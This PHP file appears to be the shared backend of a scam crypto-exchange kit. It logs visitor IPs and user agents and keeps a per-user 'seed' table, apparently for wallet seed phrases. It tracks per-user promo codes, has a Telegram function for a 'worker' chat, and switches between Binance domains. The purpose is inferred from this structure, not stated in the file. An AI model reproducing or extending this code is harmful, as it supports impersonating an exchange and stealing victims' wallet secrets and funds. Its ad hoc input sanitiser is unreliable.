<?php
#session_start();
$url = 'https://'.$_SERVER['SERVER_NAME'].'/';
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$timestamp = time();

// Load environment variables for database connection
$db_host = getenv('DB_HOST');
$db_user = getenv('DB_USER');
$db_pass = getenv('DB_PASS');
$db_name = getenv('DB_NAME');

// Connect to MySQL using PDO
try {
    // Main database connection (replacing $db)
    $dsn = "mysql:host=$db_host;dbname=$db_name;charset=utf8mb4";
    $db = new PDO($dsn, $db_user, $db_pass);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // We'll use the same database for balance and visits, but with different tables
    $dbB = $db; // Balance database (same connection, different table)
    $dbV = $db; // Visits database (same connection, different table)
} catch (PDOException $e) {
    die("Database connection failed: " . $e->getMessage());
}

// Create tables if they don't exist (equivalent to SQLite schema)
// For $db (main database)
$db->exec("CREATE TABLE IF NOT EXISTS settings (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    tg_admin TEXT,
    tg_bot TEXT,
    ts TEXT,
    domain_cur TEXT
)");

$db->exec("CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    uuid TEXT,
    -- Add other columns as needed based on your app's schema
    email TEXT
)");

$db->exec("CREATE TABLE IF NOT EXISTS promo_actived (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    user TEXT,
    promo TEXT
)");

// For $dbB (balance database)
$dbB->exec("CREATE TABLE IF NOT EXISTS balances (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    -- Add columns based on your balance schema
    user_id TEXT,
    balance TEXT
)");

// For $dbV (visits database)
$dbV->exec("CREATE TABLE IF NOT EXISTS visitors (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    ip TEXT,
    timestamp INTEGER
)");

$dbV->exec("CREATE TABLE IF NOT EXISTS users_seed (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    uuid TEXT,
    -- Add other columns as needed
    seed TEXT
)");

$dbV->exec("CREATE TABLE IF NOT EXISTS settings_json (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    balance TEXT
)");

// Fetch settings (equivalent to SQLite query)
$stmt = $db->prepare('SELECT * FROM settings WHERE id=1');
$stmt->execute();
$USER_S = $stmt->fetch(PDO::FETCH_ASSOC);

$chat_id = $USER_S['tg_admin'];
$bot_token = $USER_S['tg_bot'];
$ts_id = $USER_S['ts'];

if (isset($_SESSION['uuid'])) {
    // Fetch user data
    $stmt = $db->prepare('SELECT * FROM users WHERE uuid = :uuid');
    $stmt->execute(['uuid' => $_SESSION['uuid']]);
    $USER = $stmt->fetch(PDO::FETCH_ASSOC);

    // Fetch user seed data
    $stmt = $dbV->prepare('SELECT * FROM users_seed WHERE uuid = :uuid');
    $stmt->execute(['uuid' => $_SESSION['uuid']]);
    $USER_SEED = $stmt->fetch(PDO::FETCH_ASSOC);

    // Fetch promo data
    $stmt = $db->prepare('SELECT * FROM promo_actived WHERE user = :user');
    $stmt->execute(['user' => $_SESSION['uuid']]);
    $USER_PROMO = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!isset($USER_PROMO['promo'])) {
        $USER_PROMO['promo'] = "Не введен";
    }
}

function getBrowers(){
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    if (preg_match('/\b(?:MSIE|Chrome|Firefox|Safari|Opera)\b/i', $user_agent, $matches)) {
        $browser = $matches[0];
        preg_match('/\b(?:Version|MSIE|Chrome|Firefox|Safari|Opera)[\/ ]?([0-9.]+)/i', $user_agent, $matches);
        $version = $matches[1];
    }
    return $browser."|".$version;
}

function getAgent(){
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    if (preg_match('/\b(?:Windows|Mac OS X|iOS|Android)\b/i', $user_agent, $matches)) {
        $os = $matches[0];
        preg_match('/\b(?:Windows NT|Mac OS X|CPU OS|Android)[\/ ]?([0-9._]+)/i', $user_agent, $matches);
        $version = $matches[1];
    }
    return $os."|".$version;
}

function getDepTokensBalance(){
    global $dbV;
    $stmt = $dbV->prepare('SELECT * FROM settings_json WHERE id = :id');
    $stmt->execute(['id' => 1]);
    $arr = $stmt->fetch(PDO::FETCH_ASSOC);
    return $arr['balance'];
}

function sendTelegramMessage($chat_id, $message, $bot_token)
{
    $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
    $post_fields = array(
        'chat_id' => $chat_id,
        'text' => $message
    );
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    $result = json_decode($response, true);
    return $result;
}

function sendTelegramMessageWorker($promo, $message, $bot_token)
{
    $chat_id = '';
    if(isset($promo)){
        $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
        $post_fields = array(
            'chat_id' => $chat_id,
            'text' => $message
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);
        $result = json_decode($response, true);
        return $result;
    }
}

function guardText($str,$chars = array('/',"'",'"','(',')',';','>','<'),$allowedTags = '') {
    $str = str_replace($chars,'',strip_tags($str,$allowedTags));
    return preg_replace("/[^A-Za-z0-9_\-\.\/\\p{L}[\p{L} _.-]/u",'',$str);
}

function getSettings($type, $db){
    $t = false;
    if($type == '1domain_cur'){
        $t = true;
        $type = 'domain_cur';
    }
    $stmt = $db->prepare('SELECT * FROM settings WHERE id=1');
    $stmt->execute();
    $arr = $stmt->fetch(PDO::FETCH_ASSOC);
    $get_info = $arr[$type];

    if($t){
        if(($get_info == 'binance.us') or ($get_info == 'binance.com')){
            $get_info = 'api.'.$get_info;
        }
    }else{
        if(($get_info == 'binance.us') or ($get_info == 'binance.com')){
            $get_info = 'www.'.$get_info;
        }
    }

    return $get_info;
}

// Dev by @cryptostudio_dev
?>